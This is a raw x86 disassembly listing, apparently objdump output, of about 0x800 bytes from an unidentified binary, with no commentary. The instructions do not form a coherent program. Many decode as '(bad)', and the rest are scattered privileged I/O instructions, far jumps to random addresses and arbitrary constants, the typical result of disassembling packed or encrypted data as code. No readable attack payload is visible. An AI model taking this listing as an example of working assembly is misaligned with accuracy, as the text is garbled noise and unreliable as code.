  4164e9:	mul    edx
  4164eb:	push   cs
  4164ec:	cmp    eax,0x33382452
  4164f1:	dec    ebp
  4164f2:	inc    eax
  4164f3:	jns    0x416487
  4164f5:	xchg   edi,eax
  4164f6:	fnstenv [edi+0x19]
  4164f9:	jbe    0x41650c
  4164fb:	xchg   ecx,eax
  4164fc:	hlt    
  4164fd:	(bad)  
  4164fe:	push   edx
  4164ff:	jae    0x416536
  416501:	jmp    0xb6ad77cf
  416506:	lock retf 0xfda3
  41650a:	rcl    ebp,1
  41650c:	inc    eax
  41650d:	or     DWORD PTR [edx-0x31422edd],esi
  416513:	jmp    0x54f3f54
  416518:	add    al,BYTE PTR [eax-0x45c61a97]
  41651e:	jne    0x416529
  416520:	dec    ecx
  416521:	inc    esp
  416522:	mov    bh,0x3b
  416524:	pusha  
  416525:	sub    cl,BYTE PTR [ebx]
  416527:	(bad)  
  416528:	ins    DWORD PTR es:[edi],dx
  416529:	(bad)  
  41652a:	in     eax,0xd0
  41652c:	jno    0x4164cb
  41652e:	sub    ah,BYTE PTR ds:[ebp+0x2bf3f991]
  416535:	rcl    BYTE PTR [eax-0x41962fc3],1
  41653b:	or     BYTE PTR [ebp+esi*8+0x6e],cl
  41653f:	mul    BYTE PTR [esp+esi*2+0x9]
  416543:	(bad)  
  416544:	mov    ah,0x12
  416546:	push   cs
  416547:	pop    edi
  416548:	xlat   BYTE PTR ds:[ebx]
  416549:	jae    0x416570
  41654b:	in     eax,0xf7
  41654d:	pop    edx
  41654e:	xchg   ecx,eax
  41654f:	sub    cl,al
  416551:	repnz scas al,BYTE PTR es:[edi]
  416553:	cmp    dh,ch
  416555:	call   0xa0fc:0x8d81248d
  41655c:	pushf  
  41655d:	jae    0x41655a
  41655f:	mov    edx,0x922e7c65
  416564:	mov    ebp,DWORD PTR [edx]
  416566:	xor    DWORD PTR [esp+esi*1+0x72896b54],edi
  41656d:	out    0x8a,eax
  41656f:	lods   eax,DWORD PTR ds:[esi]
  416570:	leave  
  416571:	inc    eax
  416572:	sub    cl,bl
  416574:	xchg   ecx,eax
  416575:	sub    DWORD PTR [edi+0x79],ebp
  416578:	xchg   esi,eax
  416579:	aas    
  41657a:	rcl    edx,cl
  41657c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41657d:	fisttp DWORD PTR [ebp+0x3bc0f54a]
  416583:	ins    DWORD PTR es:[edi],dx
  416584:	aam    0xa2
  416586:	fdiv   DWORD PTR [bx]
  416589:	mov    ds:0xb227f66f,al
  41658e:	iret   
  41658f:	fwait
  416590:	jo     0x416570
  416592:	push   ecx
  416593:	dec    ecx
  416594:	xor    esi,edi
  416596:	add    esp,DWORD PTR [ecx+0x10]
  416599:	data16 mov al,BYTE PTR [ebx-0x2]
  41659d:	push   0xffffff90
  41659f:	push   cs
  4165a0:	jp     0x4165b4
  4165a2:	push   edx
  4165a3:	xchg   esi,eax
  4165a4:	mov    cl,0x21
  4165a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165a7:	fdivr  DWORD PTR [esi-0x658932c9]
  4165ad:	dec    esi
  4165ae:	fmul   QWORD PTR [edi-0x13]
  4165b1:	cmp    bl,BYTE PTR [eax]
  4165b3:	sub    al,0xf1
  4165b5:	rcr    DWORD PTR [ebx+0x225c3f6c],0xd6
  4165bc:	aad    0x1d
  4165be:	push   edx
  4165bf:	mov    ebx,0xb8bea89f
  4165c4:	push   esi
  4165c5:	xchg   esp,edx
  4165c7:	or     ebx,DWORD PTR [ecx]
  4165c9:	push   ebx
  4165ca:	cwde   
  4165cb:	sar    BYTE PTR ds:0x7ceeb24d,cl
  4165d1:	pop    ecx
  4165d2:	jbe    0x41657d
  4165d4:	inc    edx
  4165d5:	popf   
  4165d6:	mov    ds:0x2ac96e7f,al
  4165db:	mov    WORD PTR [ebp+0x47],cs
  4165de:	or     al,BYTE PTR [edx+0x5]
  4165e1:	(bad)  
  4165e2:	xchg   edi,eax
  4165e3:	ror    BYTE PTR [ebp-0x17],cl
  4165e6:	sbb    dl,BYTE PTR [bx+di]
  4165e9:	sub    DWORD PTR [ebx-0x2ba4a5ce],ebx
  4165ef:	nop
  4165f0:	xchg   ecx,eax
  4165f1:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4165f3:	out    0xce,al
  4165f5:	icebp  
  4165f6:	(bad)  
  4165f7:	sti    
  4165f8:	pop    esp
  4165f9:	lods   eax,DWORD PTR ds:[esi]
  4165fa:	(bad)
  4165fd:	push   eax
  4165fe:	jae    0x4165a5
  416600:	outs   dx,DWORD PTR ds:[esi]
  416601:	ret    0xc7d
  416604:	jg     0x4165b9
  416606:	popa   
  416607:	rol    ah,1
  416609:	out    dx,al
  41660a:	xlat   BYTE PTR ds:[ebx]
  41660b:	mov    ebp,0x1b354c9d
  416610:	leave  
  416611:	xchg   edi,eax
  416612:	pusha  
  416613:	sub    al,0x47
  416615:	xor    al,0xe9
  416618:	dec    edx
  416619:	cwde   
  41661a:	imul   BYTE PTR [esi+ebx*2]
  41661d:	mov    BYTE PTR [ebx],dh
  41661f:	lock sbb ebp,ebx
  416622:	jge    0x4165ac
  416624:	hlt    
  416625:	mov    cl,0x7c
  416627:	xor    eax,0xcb71cf73
  41662c:	fiadd  DWORD PTR [eax+edi*8-0x31a40115]
  416633:	lods   eax,DWORD PTR ds:[esi]
  416634:	sub    edx,0xb77ec7e8
  41663a:	sub    eax,0xe3550d97
  41663f:	push   ebx
  416640:	dec    edx
  416641:	ss (bad) 
  416643:	push   edi
  416644:	xlat   BYTE PTR ds:[ebx]
  416645:	jge    0x4166b6
  416647:	sub    eax,0x28744bd4
  41664c:	popf   
  41664d:	mov    ebx,0xd12dc322
  416652:	xlat   BYTE PTR ds:[ebx]
  416653:	pop    esp
  416654:	imul   edi,DWORD PTR [ecx-0x197d9caa],0x5169d9eb
  41665e:	sete   BYTE PTR [ecx]
  416661:	push   ecx
  416662:	lahf   
  416663:	pop    edx
  416664:	or     esi,DWORD PTR [ebx-0x4e]
  416667:	add    al,0x47
  416669:	cli    
  41666a:	test   DWORD PTR [edx+0x1ca5953b],edi
  416670:	pushfw 
  416672:	mov    bh,0x3
  416674:	gs jo  0x416671
  416677:	mul    BYTE PTR [ecx-0x5a]
  41667a:	xchg   BYTE PTR ds:0xfe0ab6c7,al
  416680:	mov    cl,0x72
  416682:	es shl dl,cl
  416685:	xor    al,0x7a
  416687:	xor    eax,0xf6223c02
  41668c:	dec    ecx
  41668d:	(bad)  
  41668e:	je     0x416705
  416690:	clc    
  416691:	sti    
  416692:	jp     0x4166af
  416694:	cmp    eax,0xdec51be9
  416699:	out    dx,eax
  41669a:	push   ebp
  41669b:	repz add eax,0x1c87f39e
  4166a1:	cmp    eax,ebx
  4166a3:	iret   
  4166a4:	ror    DWORD PTR [esi],0xc9
  4166a7:	addr16 loopne 0x41664a
  4166aa:	mov    ecx,0xaa06d833
  4166af:	je     0x416682
  4166b1:	pop    edi
  4166b2:	cmc    
  4166b3:	or     DWORD PTR [ecx-0x77da9868],0x7e4683ee
  4166bd:	mov    esp,0x9911a795
  4166c2:	out    dx,eax
  4166c3:	push   0xffffffb3
  4166c5:	dec    esp
  4166c6:	popf   
  4166c7:	fistp  DWORD PTR [eax+0xb]
  4166ca:	stos   BYTE PTR es:[edi],al
  4166cb:	push   0xffffffc5
  4166cd:	mov    eax,0x93725f53
  4166d2:	das    
  4166d3:	push   ecx
  4166d4:	sbb    BYTE PTR [esp+edx*2-0x3b878463],0x2e
  4166dc:	or     bh,bl
  4166de:	mov    edi,0x70d07a6b
  4166e3:	nop
  4166e4:	pusha  
  4166e5:	loop   0x416708
  4166e7:	call   0xa884cf8
  4166ec:	dec    eax
  4166ed:	jmp    0xb3cde95a
  4166f2:	and    al,0xc
  4166f4:	(bad)  
  4166f5:	jmp    0x4166b4
  4166f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166f8:	lea    ebp,[edx-0x380956d2]
  4166fe:	add    BYTE PTR ds:0xf9d804b8,0x84
  416705:	mov    ebx,0xe8428c57
  41670a:	out    dx,eax
  41670b:	hlt    
  41670c:	push   ds
  41670d:	push   edi
  41670e:	dec    ebx
  41670f:	dec    edx
  416710:	arpl   WORD PTR [eax+0x73],dx
  416713:	xchg   ecx,eax
  416714:	imul   BYTE PTR [edi]
  416716:	mov    al,ch
  416718:	data16 in al,0x87
  41671b:	pop    ebp
  41671c:	xchg   esp,eax
  41671d:	call   0xa8a64d38
  416722:	mov    ah,0x45
  416724:	and    ah,BYTE PTR [ecx]
  416726:	mov    BYTE PTR [esi],dh
  416728:	xchg   esi,eax
  416729:	push   esi
  41672a:	call   0x6b32:0x4aeaf220
  416731:	lods   eax,DWORD PTR ds:[esi]
  416732:	scas   al,BYTE PTR es:[edi]
  416733:	mov    DWORD PTR [ecx],0xca469b85
  416739:	add    edi,DWORD PTR [eax+0x41]
  41673c:	inc    ebp
  41673d:	push   edi
  41673e:	sub    al,0x52
  416740:	lahf   
  416741:	xor    al,0x33
  416743:	cmp    al,0xea
  416745:	(bad)  
  416746:	std    
  416747:	int    0xd1
  416749:	dec    edi
  41674a:	test   al,0xab
  41674c:	(bad)
  416750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416751:	stos   BYTE PTR es:[edi],al
  416752:	inc    ebx
  416753:	inc    ebp
  416754:	add    BYTE PTR [esi+0x24],bl
  416757:	push   ecx
  416758:	rcr    DWORD PTR [ebx+ebx*1-0x2aafaedb],0xdc
  416760:	sbb    al,0xe5
  416762:	mov    dl,BYTE PTR [ebx]
  416764:	fs pop esp
  416766:	cmp    BYTE PTR [edi+0x53],bl
  416769:	sub    al,0xbe
  41676b:	leave  
  41676c:	pushf  
  41676d:	jl     0x416754
  41676f:	inc    ebp
  416770:	jbe    0x41675f
  416772:	cdq    
  416773:	out    0x2b,al
  416775:	and    bl,BYTE PTR [eax+0x314128ad]
  41677b:	(bad)  
  41677c:	jge    0x41670a
  41677e:	les    eax,FWORD PTR [edi+0x67]
  416781:	dec    ebp
  416782:	(bad)  
  416783:	adc    BYTE PTR [esi-0x27],ch
  416786:	cs in  al,0x97
  416789:	mov    al,ds:0xc12da861
  41678e:	push   edx
  41678f:	sbb    dh,al
  416791:	xor    BYTE PTR [ebx],ch
  416793:	and    esi,ecx
  416795:	mov    cs,WORD PTR [esi]
  416797:	xchg   edx,eax
  416798:	mov    edx,esp
  41679a:	pop    ecx
  41679b:	aad    0x2b
  41679d:	pop    ds
  41679e:	xor    al,0x1d
  4167a0:	push   edi
  4167a1:	push   edx
  4167a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167a3:	lea    ecx,[ecx]
  4167a5:	stc    
  4167a6:	xor    DWORD PTR ds:0x85569b46,0x17dfe736
  4167b0:	pop    ds
  4167b1:	mov    eax,ds:0x2b0bd20
  4167b6:	(bad)  
  4167b7:	mul    BYTE PTR [edx-0x56]
  4167ba:	fwait
  4167bb:	(bad)  
  4167bc:	pop    ss
  4167bd:	sub    al,0x82
  4167bf:	and    DWORD PTR [esi-0x11e7575f],0xb9f2583b
  4167c9:	nop
  4167ca:	loope  0x416809
  4167cc:	lods   eax,DWORD PTR ds:[si]
  4167ce:	jle    0x416847
  4167d0:	(bad)  
  4167d1:	jns    0x4167a4
  4167d3:	add    eax,0x2ce2ba42
  4167d8:	fsubr  QWORD PTR [eax]
  4167da:	xchg   esi,eax
  4167db:	inc    eax
  4167dc:	push   cs
  4167dd:	rcl    DWORD PTR [eax+0x7c02e164],1
  4167e3:	jmp    0x9881e1de
  4167e8:	daa    
  4167e9:	mov    bh,0x66
  4167eb:	fst    DWORD PTR [edi-0x7304a5b3]
  4167f1:	imul   ebp,DWORD PTR [ebp+0x7c11d0aa],0xffffffbc
  4167f8:	ds mov ecx,0xb1743973
  4167fe:	and    dl,bl
  416800:	cmp    DWORD PTR [eax],edx
  416802:	fdivr  st(4),st
  416804:	test   DWORD PTR [eax+edx*4],esp
  416807:	fmul   st,st(0)
  416809:	lea    ebp,[eax]
  41680b:	mov    eax,0x494955e
  416810:	inc    ecx
  416811:	push   edi
  416812:	sbb    bh,cl
  416814:	mov    ch,0xff
  416816:	jle    0x41681c
  416818:	jnp    0x416852
  41681a:	stos   DWORD PTR es:[edi],eax
  41681b:	daa    
  41681c:	inc    esp
  41681d:	(bad)  
  41681e:	mov    esi,0x7e567aab
  416823:	xor    BYTE PTR [edi],dl
  416825:	sub    eax,0x60fe4724
  41682a:	inc    esp
  41682b:	sub    DWORD PTR [ebx-0x4a4745c6],edx
  416831:	dec    edx
  416832:	xchg   BYTE PTR [ecx],bh
  416834:	scas   eax,DWORD PTR es:[edi]
  416835:	rcr    DWORD PTR [edx+edi*2],1
  416838:	(bad)  
  416839:	out    dx,al
  41683a:	sub    BYTE PTR [eax],dh
  41683c:	hlt    
  41683d:	cs call 0x2faea709
  416843:	mov    dl,0xe5
  416845:	mov    BYTE PTR [esi+0x1b6d5e71],ah
  41684b:	jns    0x41689a
  41684d:	dec    ebp
  41684e:	pop    ebx
  41684f:	pop    esp
  416850:	xchg   ch,bl
  416852:	xor    al,0xb7
  416854:	or     eax,DWORD PTR [edi-0x49]
  416857:	jmp    0xbd05:0x6a69d0ee
  41685e:	sbb    al,0x7f
  416860:	repnz jecxz 0x4168cb
  416863:	jbe    0x41681d
  416865:	sub    al,0x50
  416867:	sub    BYTE PTR [ecx],bl
  416869:	mov    esp,DWORD PTR [esi-0x49d3fe51]
  41686f:	and    ebp,DWORD PTR [ebp-0x2d]
  416872:	jo     0x416828
  416874:	test   al,0xd3
  416876:	int    0x8
  416878:	mov    ds:0xee423dfe,al
  41687d:	ret    
  41687e:	mov    al,ds:0xcc71416f
  416883:	cdq    
  416884:	jno    0x416876
  416886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416887:	dec    edi
  416888:	mov    ds:0x922ffa97,al
  41688d:	(bad)  [ebp-0x200ba335]
  416893:	fadd   DWORD PTR [edx-0x10]
  416896:	inc    ebp
  416897:	dec    eax
  416898:	ror    BYTE PTR [ecx],cl
  41689a:	push   ecx
  41689b:	test   al,0xe9
  41689d:	(bad)  
  41689e:	pop    ds
  41689f:	push   ebp
  4168a0:	xchg   esi,eax
  4168a1:	jo     0x41684c
  4168a3:	stc    
  4168a4:	xchg   ebp,eax
  4168a5:	xor    al,0xba
  4168a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168a8:	int3   
  4168a9:	pop    edx
  4168aa:	out    dx,al
  4168ab:	(bad)  
  4168ac:	mov    al,0x33
  4168ae:	add    edi,DWORD PTR [ebx-0x1380ab65]
  4168b4:	inc    esp
  4168b5:	cmp    ch,bl
  4168b7:	sub    ah,0x55
  4168ba:	and    ah,BYTE PTR ds:0x4c31139
  4168c0:	cmp    DWORD PTR [eax+0x61],edi
  4168c3:	push   esi
  4168c4:	cld    
  4168c5:	sub    ebx,DWORD PTR [ebx+0xce70c89]
  4168cb:	into   
  4168cc:	fmulp  st(4),st
  4168ce:	mov    eax,ds:0x2d38c81d
  4168d3:	add    edi,DWORD PTR [ecx+eiz*1+0x70]
  4168d7:	fstp   DWORD PTR [ebx]
  4168d9:	ins    BYTE PTR es:[edi],dx
  4168da:	mov    ah,0xc0
  4168dc:	sti    
  4168dd:	jo     0x4168d2
  4168df:	inc    edi
  4168e0:	push   0x29e106e3
  4168e5:	sub    eax,0x22267aba
  4168ea:	(bad)  
  4168eb:	xor    al,0xa8
  4168ed:	sbb    DWORD PTR [ecx-0x64],edi
  4168f0:	pop    ebp
  4168f1:	test   al,0xbb
  4168f3:	rol    BYTE PTR [esi+0x46],0x82
  4168f7:	int3   
  4168f8:	jno    0x4168aa
  4168fa:	in     eax,dx
  4168fb:	out    0x15,eax
  4168fd:	es push esi
  4168ff:	cmp    BYTE PTR [eax-0x10],dh
  416902:	popf   
  416903:	add    BYTE PTR [edi],ah
  416905:	xchg   ebx,eax
  416906:	adc    eax,0x6d231a43
  41690b:	pop    ebx
  41690c:	push   es
  41690d:	ds (bad) 
  41690f:	xor    eax,DWORD PTR [ecx-0x29a2b05f]
  416915:	shl    DWORD PTR [eax],1
  416917:	cmc    
  416918:	fistp  WORD PTR [edx]
  41691a:	xor    BYTE PTR [eax-0x52540f13],cl
  416920:	cmp    al,0xcc
  416922:	pop    esi
  416923:	jge    0x416968
  416925:	iret   
  416926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416927:	adc    BYTE PTR [esi+0x794ddb6d],bl
  41692d:	and    BYTE PTR [esi+0x54ed4504],cl
  416933:	pop    es
  416934:	jmp    0xb1e1a5b2
  416939:	jbe    0x416970
  41693b:	in     al,dx
  41693c:	inc    ebx
  41693d:	jb     0x416951
  41693f:	xchg   ecx,eax
  416940:	icebp  
  416941:	int3   
  416942:	and    BYTE PTR [ebp-0x75],ah
  416945:	adc    bl,BYTE PTR [edi+0x62]
  416948:	scas   al,BYTE PTR es:[edi]
  416949:	xor    BYTE PTR [edx-0x8],cl
  41694c:	aam    0xfe
  41694e:	arpl   WORD PTR [ebx-0x24f3a6fd],si
  416954:	and    DWORD PTR [esi-0x77],edx
  416957:	es mov bl,0x23
  41695a:	push   ss
  41695b:	pop    esp
  41695c:	fstp   DWORD PTR [edx]
  41695e:	add    edi,DWORD PTR [ebx+0x62372721]
  416964:	lds    edi,FWORD PTR [edi]
  416966:	xchg   esp,eax
  416967:	mov    ?,WORD PTR [ebx]
  416969:	scas   al,BYTE PTR es:[edi]
  41696a:	out    0x4,eax
  41696c:	fwait
  41696d:	enterw 0x5304,0x93
  416972:	(bad)
  416976:	jmp    0xfdc9:0x3858c581
  41697d:	jmp    0x416975
  41697f:	add    BYTE PTR [eax],al
  416981:	in     al,0x48
  416983:	jmp    0x1807:0x89b025a6
  41698a:	jle    0x41693f
  41698c:	xor    dh,BYTE PTR [edx+0x6d]
  41698f:	adc    BYTE PTR [esi-0x1c],al
  416992:	js     0x4169ab
  416994:	scas   al,BYTE PTR es:[edi]
  416995:	mov    cl,0xab
  416997:	jns    0x416997
  416999:	lods   eax,DWORD PTR ds:[esi]
  41699a:	aaa    
  41699b:	sub    ch,BYTE PTR [edx]
  41699d:	sbb    DWORD PTR [eax+ebp*1+0x798a69b3],eax
  4169a4:	fiadd  DWORD PTR [ecx+eax*2]
  4169a7:	adc    edi,DWORD PTR [eax+0x6e]
  4169aa:	ret    0xadbe
  4169ad:	mov    al,ds:0xa2dbe454
  4169b2:	int3   
  4169b3:	push   0xffffffd7
  4169b5:	ins    BYTE PTR es:[edi],dx
  4169b6:	mov    ebp,DWORD PTR [ecx+0x2]
  4169b9:	call   0xcd46d2f9
  4169be:	call   0x32b98360
  4169c3:	inc    esp
  4169c4:	das    
  4169c5:	std    
  4169c6:	pop    esp
  4169c7:	stos   DWORD PTR es:[edi],eax
  4169c8:	lahf   
  4169c9:	jae    0x416a1d
  4169cb:	test   BYTE PTR [eax+0xf4861f],0xdc
  4169d2:	arpl   WORD PTR ds:0xce37d2d3,dx
  4169d8:	rcr    ch,1
  4169da:	hlt    
  4169db:	mov    dl,0xed
  4169dd:	mov    ebp,DWORD PTR [ecx+0x1b431371]
  4169e3:	or     eax,0x29810c22
  4169e8:	jmp    0x416a09
  4169ea:	add    eax,0x9039605c
  4169ef:	pushf  
  4169f0:	enter  0xd72b,0xcc
  4169f4:	stos   DWORD PTR es:[edi],eax
  4169f5:	jle    0x416a5d
  4169f7:	mov    eax,0x462b7d18
  4169fc:	xor    BYTE PTR [ecx-0x42],0x9c
  416a00:	ror    BYTE PTR [ebx-0x5880ad3f],0xdc
  416a07:	ins    DWORD PTR es:[edi],dx
  416a08:	fiadd  WORD PTR [esi]
  416a0a:	cmp    dl,BYTE PTR [ecx+0x45cf56b5]
  416a10:	push   ebp
  416a11:	jg     0x416a1f
  416a13:	cmp    DWORD PTR [esi],ebx
  416a15:	mov    ds:0x3200ef56,al
  416a1a:	jne    0x416a87
  416a1c:	jmp    DWORD PTR [esi]
  416a1e:	fld    st(5)
  416a20:	out    0xc7,al
  416a22:	xchg   ecx,eax
  416a23:	pop    ebx
  416a24:	test   bh,0xcf
  416a27:	and    bh,BYTE PTR [edi+0x27deb03d]
  416a2d:	pop    edx
  416a2e:	cmp    dh,al
  416a30:	xlat   BYTE PTR ds:[ebx]
  416a31:	ins    BYTE PTR es:[edi],dx
  416a32:	xor    al,0x39
  416a34:	clc    
  416a35:	mov    ch,0x59
  416a37:	(bad)  
  416a38:	mov    edx,0xe9df2584
  416a3d:	mov    ecx,esp
  416a3f:	ins    DWORD PTR es:[edi],dx
  416a40:	xor    cl,ah
  416a42:	inc    edx
  416a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a44:	nop
  416a45:	scas   al,BYTE PTR es:[edi]
  416a46:	repnz mov eax,ds:0xf31ec436
  416a4c:	push   ss
  416a4d:	pop    ss
  416a4e:	jbe    0x416aa4
  416a50:	jae    0x4169fe
  416a52:	pop    ecx
  416a53:	aad    0xed
  416a55:	push   es
  416a56:	push   eax
  416a57:	mov    ebx,0xd569c830
  416a5c:	push   es
  416a5d:	or     BYTE PTR [edi-0x2],ah
  416a60:	test   eax,0xa2b41bcb
  416a65:	sbb    eax,0x544f42b5
  416a6a:	dec    esp
  416a6b:	test   al,0xbc
  416a6d:	pop    eax
  416a6e:	jmp    0x416aae
  416a70:	std    
  416a71:	icebp  
  416a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a73:	mov    cl,BYTE PTR [ecx]
  416a75:	rol    ecx,1
  416a77:	fcmovb st,st(2)
  416a79:	push   edx
  416a7a:	pusha  
  416a7b:	and    edi,esp
  416a7d:	pop    eax
  416a7e:	push   edx
  416a7f:	dec    ebx
  416a80:	in     al,0xdd
  416a82:	sub    ecx,DWORD PTR [eax-0x7cce97a]
  416a88:	jle    0x416b08
  416a8a:	dec    esp
  416a8b:	test   DWORD PTR [ecx-0x2b],edx
  416a8e:	cmp    DWORD PTR [ebp+0x43],esp
  416a91:	jnp    0x416b0f
  416a93:	mov    ebp,0x865752c8
  416a98:	ins    BYTE PTR es:[edi],dx
  416a99:	adc    al,al
  416a9b:	std    
  416a9c:	add    ebx,ebp
  416a9e:	enter  0x8b78,0x28
  416aa2:	ds or  eax,0xd8da9673
  416aa8:	jp     0x416b19
  416aaa:	shr    BYTE PTR [eax-0x37eaf5c5],0x5e
  416ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ab2:	stc    
  416ab3:	push   0x92374c49
  416ab8:	cmp    al,0x4b
  416aba:	jecxz  0x416aee
  416abc:	adc    eax,DWORD PTR [ebx-0x6b]
  416abf:	pop    ebp
  416ac0:	inc    eax
  416ac1:	add    ah,dl
  416ac3:	pop    edi
  416ac4:	push   ds
  416ac5:	shl    esp,cl
  416ac7:	inc    esp
  416ac8:	imul   DWORD PTR [edx-0xc3f1f81]
  416ace:	aaa    
  416acf:	in     al,0x40
  416ad1:	jae    0x416ab8
  416ad3:	cmp    al,0xd6
  416ad5:	pop    esi
  416ad6:	movq   mm4,mm5
  416ad9:	xchg   BYTE PTR [ecx+0x63af4506],bh
  416adf:	sti    
  416ae0:	push   0x3b9a7a1b
  416ae5:	mov    ebx,0xc5f58973
  416aea:	mov    ebx,0x74d9c222
  416aef:	dec    edi
  416af0:	retf   
  416af1:	scas   eax,DWORD PTR es:[edi]
  416af2:	mov    ebp,DWORD PTR [edi-0x3f42c07b]
  416af8:	lods   eax,DWORD PTR ds:[esi]
  416af9:	fisttp DWORD PTR [edx]
  416afb:	adc    DWORD PTR [eax-0x7d],edi
  416afe:	data16 xor al,0xed
  416b01:	sbb    BYTE PTR [esi+0x36],ah
  416b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b05:	inc    ebp
  416b06:	lods   al,BYTE PTR ds:[esi]
  416b07:	clc    
  416b08:	call   0xcce8:0x9fcc6128
  416b0f:	sub    al,dl
  416b11:	and    cl,BYTE PTR [eax-0x7]
  416b14:	xor    dl,BYTE PTR [ebx]
  416b16:	xchg   edi,eax
  416b17:	lahf   
  416b18:	icebp  
  416b19:	sub    BYTE PTR [ebp-0x1a],al
  416b1c:	nop
  416b1d:	pop    edi
  416b1e:	and    BYTE PTR [edx],ch
  416b20:	test   ax,0xa8b4
  416b24:	outs   dx,DWORD PTR ds:[esi]
  416b25:	push   ds
  416b26:	ret    0xa67c
  416b29:	mov    esi,0x93aeb839
  416b2e:	dec    eax
  416b2f:	xchg   edi,eax
  416b30:	mov    esi,0x417b121e
  416b35:	mov    ebx,0x4d44028
  416b3a:	fcmovb st,st(1)
  416b3c:	push   ebp
  416b3d:	push   cs
  416b3e:	(bad)  
  416b3f:	loopne 0x416ad7
  416b41:	loop   0x416af4
  416b43:	aaa    
  416b44:	inc    edx
  416b45:	xchg   esi,eax
  416b46:	push   esp
  416b47:	stos   DWORD PTR es:[edi],eax
  416b48:	fnstcw WORD PTR [edi+0x7aef75f1]
  416b4e:	(bad)  
  416b4f:	pextrw ecx,mm2,0x43
  416b53:	pop    eax
  416b54:	call   0xc0827ce
  416b59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b5a:	and    WORD PTR [ebp+0x5077d309],bx
  416b61:	or     al,0x76
  416b63:	out    0xf0,eax
  416b65:	mov    ds:0xbde1a854,eax
  416b6a:	xchg   ecx,eax
  416b6b:	outs   dx,DWORD PTR ds:[esi]
  416b6c:	jmp    0x24c6:0xbe1b3269
  416b73:	retf   0x4f77
  416b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b77:	in     al,dx
  416b78:	sbb    DWORD PTR [esi-0x3e],esp
  416b7b:	inc    ecx
  416b7c:	adc    cl,BYTE PTR [ebp-0x7b0f9108]
  416b82:	cli    
  416b83:	(bad)  
  416b84:	and    dl,BYTE PTR cs:0xac4492c5
  416b8b:	(bad)  
  416b8e:	xchg   ecx,eax
  416b8f:	jbe    0x416bbf
  416b91:	adc    ebx,esi
  416b93:	xor    BYTE PTR [ecx],al
  416b95:	mov    cl,0xed
  416b97:	sbb    eax,DWORD PTR [ecx]
  416b99:	jmp    0x416bc5
  416b9b:	cmp    ebx,esp
  416b9d:	aam    0xe3
  416b9f:	mov    ch,0xe6
  416ba1:	pushf  
  416ba2:	sbb    ebx,ecx
  416ba4:	cmp    al,0xe4
  416ba6:	jae    0x416bd0
  416ba8:	cmp    edi,DWORD PTR [edx+0x79]
  416bab:	mov    ch,0x63
  416bad:	loop   0x416b58
  416baf:	bts    DWORD PTR [ebp-0x6179440c],esi
  416bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bb7:	dec    ecx
  416bb8:	or     ebx,DWORD PTR [esi]
  416bba:	nop
  416bbb:	cmp    ebp,DWORD PTR [edi]
  416bbd:	in     eax,dx
  416bbe:	inc    esi
  416bbf:	mov    cs,ecx
  416bc1:	inc    ebp
  416bc2:	out    0x46,al
  416bc4:	in     eax,0xf
  416bc6:	sbb    eax,0xa9c919d3
  416bcb:	popa   
  416bcc:	repz sbb BYTE PTR [ebx],dh
  416bcf:	mov    ebp,0x512d632f
  416bd4:	add    bh,BYTE PTR [eax-0x638ab5e9]
  416bda:	lods   al,BYTE PTR ds:[esi]
  416bdb:	data16 sbb bl,BYTE PTR [ebx-0xf]
  416bdf:	xchg   ebp,eax
  416be0:	fldenv [ebx]
  416be2:	pusha  
  416be3:	dec    ebx
  416be4:	scas   al,BYTE PTR es:[edi]
  416be5:	inc    eax
  416be6:	std    
  416be7:	out    0x55,al
  416be9:	arpl   WORD PTR [ecx],ax
  416beb:	sub    eax,0x313ad09f
  416bf0:	jle    0x416c3c
  416bf2:	aad    0xc8
  416bf4:	jp     0x416bab
  416bf6:	loopne 0x416c63
  416bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bf9:	push   esi
  416bfa:	popa   
  416bfb:	and    bl,BYTE PTR [edx]
  416bfd:	into   
  416bfe:	push   eax
  416bff:	daa    
  416c00:	call   0x7916:0x5e0b356
  416c07:	xchg   BYTE PTR [ecx+0x5164746c],al
  416c0d:	xchg   ebp,eax
  416c0e:	es retf 
  416c10:	fidivr DWORD PTR [edi]
  416c12:	dec    esp
  416c13:	mov    ecx,DWORD PTR [edi+0x7c]
  416c16:	(bad)
  416c19:	push   0x802916fe
  416c1e:	push   0x73ae266
  416c23:	xchg   ecx,eax
  416c24:	div    DWORD PTR [ebp-0x22c1482c]
  416c2a:	add    al,0x3b
  416c2c:	push   es
  416c2d:	mov    edi,0xcf9aa9d8
  416c32:	add    eax,0x42f1c332
  416c37:	je     0x416c8c
  416c39:	(bad)  
  416c3a:	(bad)  
  416c3b:	jmp    0x416bf5
  416c3d:	mov    ebx,DWORD PTR [edi+edx*2+0x50]
  416c41:	out    dx,al
  416c42:	jae    0x416bd3
  416c44:	ficomp WORD PTR [edx+edx*2-0x47e3736d]
  416c4b:	xchg   edx,eax
  416c4c:	push   es
  416c4d:	xor    BYTE PTR [ebp-0x3e798f76],ah
  416c53:	(bad)  
  416c56:	fnsave [ebx-0x75]
  416c59:	(bad)  
  416c5a:	adc    al,BYTE PTR [ebx+0x3b]
  416c5d:	mov    bh,0xa6
  416c5f:	das    
  416c60:	repnz push ds
  416c62:	mov    ebx,0x2db2e447
  416c67:	push   cs
  416c68:	adc    eax,0xf236a5b8
  416c6d:	jecxz  0x416c2d
  416c6f:	hlt    
  416c70:	sub    BYTE PTR [esp+ecx*4+0x51],al
  416c74:	sbb    BYTE PTR [ebp+0x4886b06a],0xfa
  416c7b:	inc    ebx
  416c7c:	shl    esi,cl
  416c7e:	leave  
  416c7f:	popa   
  416c80:	pop    ebx
